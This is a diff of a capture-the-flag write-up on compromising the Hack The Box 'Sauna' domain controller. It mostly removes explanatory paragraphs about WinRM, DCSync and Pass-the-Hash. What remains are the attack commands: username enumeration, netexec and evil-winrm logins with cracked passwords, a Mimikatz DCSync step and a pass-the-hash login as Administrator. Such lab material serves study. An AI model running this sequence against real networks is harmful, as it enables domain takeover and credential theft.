@@ -18,9 +18,6 @@ WinRM shell as svc_loanmgr → DCSync attack → Administrator NTLM hash → roo
 ---
 
 ## 1. Recon — Port Scanning
-
-The first step is always a port scan. We can't do anything useful without knowing which services are running on the target.
-
 ```bash
 rustscan -a 10.129.18.62
 ```
@@ -57,12 +54,9 @@ This gave us something very important from LDAP:
 
 **Why do these ports matter?**
 
-Port **88 (Kerberos)** almost always means you are looking at a Domain Controller. Regular machines in a domain don't run Kerberos. When you see 88 + 389 + 53 + 464 all open on the same machine, that combination is a very strong sign that the machine is the DC. A single open port like 53 means nothing on its own, but this combination is very telling.
+Port **88 (Kerberos)** almost always means you are looking at a Domain Controller. Regular machines in a domain don't run Kerberos. When you see 88 + 389 + 53 + 464 all open on the same machine, that combination is a very strong sign that the machine is the DC.
 
-Port **5985 (WinRM)** is also important — if we get credentials later, we can use `evil-winrm` to get a remote shell through this port.
-
-We also got the domain name from LDAP: `EGOTISTICAL-BANK.LOCAL`. We added it to `/etc/hosts` so the machine name can be resolved:
-
+Let's write the domain to the hosts file:
 ```bash
 echo "10.129.18.62 EGOTISTICAL-BANK.LOCAL SAUNA.EGOTISTICAL-BANK.LOCAL" | sudo tee -a /etc/hosts
 ```
@@ -93,7 +87,7 @@ Steven Kerb
 We saved the names to a file, then used `username-anarchy` to generate all likely formats:
 
 ```bash
-ruby username-anarchy -i ~/Downloads/names > ~/Downloads/usernames.txt
+./username-anarchy -i ~/Downloads/names > ~/Downloads/usernames.txt
 ```
 
 This tool creates dozens of formats for each name: `fsmith`, `fergus.smith`, `ferguss`, `smithf`, and so on — 88 usernames in total.
@@ -185,7 +179,7 @@ The password cracked quickly, but it turned out to be the **same password as fsm
 netexec smb 10.129.18.62 -u HSmith -p Thestrokes23 --shares
 ```
 
-HSmith could read some shares but there was nothing useful inside them. This account did not give us a new path forward. However, the Kerberoasting technique itself worked perfectly — we got a valid hash and cracked it. In many real engagements and CTFs, service accounts like this have unique passwords and lead directly to privilege escalation.
+HSmith could read some shares but there was nothing useful inside them. This account did not give us a new path forward. However, the Kerberoasting technique itself worked perfectly — we got a valid hash and cracked it.
 
 ---
 
@@ -196,8 +190,6 @@ With the credentials in hand, we connected through WinRM:
 ```bash
 evil-winrm -i 10.129.18.62 -u fsmith -p Thestrokes23
 ```
-
-**What is WinRM?** Windows Remote Management lets you run PowerShell commands on a remote machine. If port 5985 is open and the user is in the `Remote Management Users` group, you can get a shell this way.
 
 We checked our privileges with `whoami /priv`:
 
@@ -244,8 +236,6 @@ evil-winrm -i 10.129.18.62 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
 
 ## 8. Domain Compromise — DCSync Attack
 
-**What is DCSync?** Domain Controllers use a protocol called `MS-DRSR` to share Active Directory data with each other (replication). Any account that has `DS-Replication-Get-Changes-All` permission can pretend to be a DC and ask the real DC to send it a user's password hash. This is called DCSync. The key point is that this is a network-based attack — we never touch the memory of the machine directly.
-
 We ran Mimikatz from the `svc_loanmgr` session:
 
 ```powershell
@@ -270,8 +260,6 @@ We used the NTLM hash directly without cracking it (**Pass-the-Hash**):
 ```bash
 evil-winrm -i 10.129.18.62 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
 ```
-
-**What is Pass-the-Hash?** In Windows NTLM authentication, the system never actually sends or checks the plaintext password — it only uses the hash. This means that if you have someone's NTLM hash, you can log in as them without ever knowing their actual password. The hash is the key.
 
 ```powershell
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
